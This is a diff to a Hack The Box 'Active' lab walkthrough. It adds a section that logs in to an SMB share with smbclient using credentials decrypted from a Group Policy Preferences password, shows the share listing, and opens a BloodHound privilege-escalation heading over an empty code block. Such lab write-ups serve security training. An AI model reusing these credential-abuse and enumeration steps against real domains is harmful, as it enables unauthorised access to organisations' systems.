@@ -7,6 +7,8 @@
     * [SMB](#SMB)
   * [Initial Access](#intial-access)
     * [Cracking Encrypted Password](#cracking-encrypted-password)
+  * [Privilege Escalation](#privilege-escalation)
+    * [Remote BloodHound](#remote-bloodhound)
 <!--te-->
 
 # **Port & Service Enumeration**
@@ -272,4 +274,35 @@ Additionally, we can use this tools to crack the password: [gpp-decrypt tool](ht
 /___/  /_/    /_/                                /___/  /_/         
 
 [ * ] Password: GPPstillStandingStrong2k18
+```
+
+## **Using *smbclient* To Login**
+
+```bash
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop/gpp-decrypt]
+└──╼ [★]$ smbclient -U 'active/SVC_TGS%GPPstillStandingStrong2k18' \\\\10.129.38.174\\Users
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sat Jul 21 09:39:20 2018
+  ..                                 DR        0  Sat Jul 21 09:39:20 2018
+  Administrator                       D        0  Mon Jul 16 05:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
+  Default                           DHR        0  Tue Jul 14 01:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
+  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
+  Public                             DR        0  Mon Jul 13 23:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018
+
+		5217023 blocks of size 4096. 277863 blocks available
+smb: \> 
+```
+
+# **Privilege Escalation**
+
+## **Remote BloodHound**
+
+Now that we have credentials to a valid user in the Domain we can run BloodHound remotely to map any privilege escalation vectors!
+
+```bash
+
 ```
